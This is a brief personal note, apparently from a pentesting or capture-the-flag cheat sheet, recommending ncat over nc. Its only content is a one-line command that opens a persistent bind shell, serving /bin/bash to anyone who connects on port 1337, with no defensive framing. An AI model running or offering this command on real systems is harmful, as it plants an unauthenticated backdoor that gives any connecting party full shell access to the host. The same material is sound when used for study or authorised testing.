---
publish: true
created: 2026-02-06T17:46:30.808+05:30
modified: 2026-06-23T12:14:18.776+05:30
---

### ncat

Instead of using `nc` for reverse shell. use ncat for bind shell. it will keep listening on this port forever.

```
./ncat -k -e /bin/bash -lp 1337
```
